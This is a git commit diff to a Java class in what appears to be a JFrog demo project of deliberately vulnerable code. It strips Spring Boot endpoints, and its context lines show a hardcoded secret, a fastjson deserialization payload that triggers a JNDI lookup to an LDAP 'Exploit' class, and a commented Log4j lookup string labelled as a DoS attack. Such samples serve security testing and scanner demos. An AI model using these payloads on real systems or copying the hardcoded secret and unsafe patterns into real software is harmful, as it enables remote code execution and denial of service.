82aefb3a53fff70563b619c390f518b4e4ee136d
Qing Wang <wq237wq@gmail.com>
2025-05-29 15:43:58 +0800

    update md

--- maven-sample/src/main/java/com/example/jfrog/demo/DemoApplication.java
+++ maven-sample/src/main/java/com/example/jfrog/demo/DemoApplication.java
@@ -2,30 +2,17 @@ package com.example.jfrog.demo;
 
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
-import org.springframework.boot.SpringApplication;
-import org.springframework.boot.autoconfigure.SpringBootApplication;
-import org.springframework.web.bind.annotation.RequestMapping;
-import org.springframework.web.bind.annotation.RestController;
+
 
 import com.alibaba.fastjson.JSON;
 
-@RestController
-@SpringBootApplication
 public class DemoApplication {
 
     private static String secretValue = "secr37Value";
 
     private static final Logger logger = LogManager.getLogger();
 
-    @RequestMapping(value = "/helloTomcat")
-    public String getHelloTomcat() {
-        return "Hello Tomcat!";
-    }
-
-    @RequestMapping(value = "/helloJFrog")
-    public String getHelloJFrog() {
-        return "Hello JFrog!";
-    }
+  
 
     public static void main(String[] args) {
         String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://127.0.0.1:1389/Exploit\"}";
@@ -69,7 +56,7 @@ public class DemoApplication {
 
         // 13. Dos attack (Works on LOG4j 2.8 - 2.16 )
         // logger.error("${${::-${::-$${::-j}}}}");
-        SpringApplication.run(DemoApplication.class, args);
+        // SpringApplication.run(DemoApplication.class, args);
 
     }
 
